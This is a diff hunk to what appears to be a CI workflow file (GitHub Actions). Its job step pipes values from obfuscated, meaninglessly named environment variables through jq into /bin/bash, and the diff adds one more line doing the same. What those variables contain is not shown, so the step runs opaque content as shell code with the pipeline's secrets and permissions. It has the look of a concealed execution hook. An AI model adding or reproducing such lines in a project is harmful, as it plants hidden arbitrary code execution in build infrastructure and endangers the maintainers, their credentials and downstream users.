@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$lefgo7" | jq -r .v83894 | /bin/bash
           printf '%s' "$lsmu1" | jq -r .snjf2 | /bin/bash
           printf '%s' "$a502" | jq -r .h11800 | /bin/bash
+          echo $knx3523 | jq -r .umz3 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
